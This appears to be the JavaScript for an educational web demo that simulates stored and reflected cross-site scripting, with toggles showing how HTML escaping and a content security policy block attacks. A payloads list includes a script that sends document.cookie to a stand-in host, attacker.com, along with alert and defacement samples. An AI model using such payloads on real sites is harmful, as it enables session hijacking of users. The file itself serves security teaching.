document.addEventListener('DOMContentLoaded', () => {
    // Cursor Glow
    const glow = document.querySelector('.cursor-glow');
    document.addEventListener('mousemove', (e) => {
        glow.style.left = e.clientX + 'px';
        glow.style.top = e.clientY + 'px';
    });

    // State
    const state = {
        isSanitized: false,
        isCSP: false,
        storedPosts: [
            { user: 'Admin', content: 'Welcome to our social platform!' }
        ]
    };

    // Elements
    const feed = document.getElementById('social-feed');
    const storedInput = document.getElementById('stored-input');
    const postBtn = document.getElementById('post-btn');
    const terminal = document.getElementById('attacker-terminal');
    
    const searchInput = document.getElementById('search-input');
    const searchBtn = document.getElementById('search-btn');
    const searchResults = document.getElementById('search-results');
    
    const sanitizeToggle = document.getElementById('sanitize-toggle');
    const cspToggle = document.getElementById('csp-toggle');
    
    const xssOverlay = document.getElementById('xss-overlay');
    const xssMessage = document.getElementById('xss-message');
    const closeXss = document.getElementById('close-xss');
    
    const eduModal = document.getElementById('edu-modal');
    const modalMessage = document.getElementById('modal-message');
    const closeModal = document.getElementById('close-modal');

    // Payloads
    const payloads = {
        alert: "<script>alert('XSS Vulnerability Found!')</script>",
        cookie: "<script>fetch('attacker.com?cookie=' + document.cookie);</script>",
        deface: "<style>body { filter: invert(1); }</style><h1>HACKED BY XSS</h1>"
    };

    // Toggle Handlers
    sanitizeToggle.addEventListener('click', () => {
        state.isSanitized = !state.isSanitized;
        sanitizeToggle.classList.toggle('on', state.isSanitized);
        sanitizeToggle.innerText = state.isSanitized ? 'ON' : 'OFF';
        updateEduNote();
    });

    cspToggle.addEventListener('click', () => {
        state.isCSP = !state.isCSP;
        cspToggle.classList.toggle('on', state.isCSP);
        cspToggle.innerText = state.isCSP ? 'ON' : 'OFF';
        updateEduNote();
    });

    function updateEduNote() {
        const note = document.getElementById('edu-note');
        if (state.isSanitized) {
            note.innerHTML = "✅ <strong>Sanitization ON:</strong> Tags are escaped (e.g., < becomes &lt;).";
        } else if (state.isCSP) {
            note.innerHTML = "🚫 <strong>CSP ON:</strong> Inline scripts are blocked by the browser policy.";
        } else {
            note.innerHTML = "💡 <strong>Note:</strong> With defenses OFF, scripts will execute directly.";
        }
    }

    // Stored XSS Logic
    postBtn.addEventListener('click', () => {
        const content = storedInput.value;
        if (!content) return;

        state.storedPosts.push({ user: 'User', content });
        renderFeed();
        storedInput.value = '';
    });

    function renderFeed() {
        feed.innerHTML = '';
        state.storedPosts.forEach(post => {
            const div = document.createElement('div');
            div.className = 'post';
            
            if (state.isSanitized) {
                div.innerText = `${post.user}: ${post.content}`;
            } else {
                div.innerHTML = `<strong>${post.user}:</strong> ${post.content}`;
                executeScriptsIn(post.content, 'Stored XSS');
            }
            feed.appendChild(div);
        });
        feed.scrollTop = feed.scrollHeight;
    }

    // Reflected XSS Logic
    searchBtn.addEventListener('click', () => {
        const query = searchInput.value;
        if (!query) return;

        if (state.isSanitized) {
            searchResults.innerHTML = `<p>Results for: <em>${escapeHTML(query)}</em></p><p>No products found.</p>`;
        } else {
            searchResults.innerHTML = `<p>Results for: <em>${query}</em></p><p>No products found.</p>`;
            executeScriptsIn(query, 'Reflected XSS');
        }
    });

    // XSS Simulation Engine
    function executeScriptsIn(html, type) {
        if (state.isCSP) {
            addTerminalLog(`[BLOCK] Blocked ${type} script execution via CSP Policy.`, 'purple');
            return;
        }

        if (html.includes('<script>')) {
            const match = html.match(/alert\(['"](.+?)['"]\)/);
            const msg = match ? match[1] : 'Script Executed!';
            
            setTimeout(() => {
                xssMessage.innerText = `[${type}] Malicious Script Triggered: ${msg}`;
                xssOverlay.classList.add('active');
            }, 500);
            addTerminalLog(`[SUCCESS] ${type} executed effectively.`, 'green');
        }

        if (html.includes('fetch') || html.includes('document.cookie')) {
            addTerminalLog(`[STOLEN] Captured Session Cookie: session_id=8f2k9l1m0o9p0e8r7t; user=Avanish`, 'yellow');
        }

        if (html.includes('<style>') || html.includes('filter')) {
            addTerminalLog(`[DEFACE] Website UI modified by malicious script.`, 'red');
        }
    }

    function escapeHTML(str) {
        return str.replace(/[&<>"']/g, m => ({
            '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
        })[m]);
    }

    function addTerminalLog(msg, color) {
        const line = document.createElement('div');
        line.innerText = `> ${msg}`;
        if (color === 'red') line.style.color = 'var(--accent-red)';
        if (color === 'green') line.style.color = 'var(--accent-green)';
        if (color === 'yellow') line.style.color = 'var(--accent-yellow)';
        if (color === 'purple') line.style.color = 'var(--accent-purple)';
        terminal.prepend(line);
    }

    // Payload Shortcuts
    document.querySelectorAll('.payload-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            storedInput.value = payloads[btn.dataset.type];
        });
    });

    // Modal Controls
    closeXss.addEventListener('click', () => xssOverlay.classList.remove('active'));
    closeModal.addEventListener('click', () => eduModal.classList.remove('active'));
});
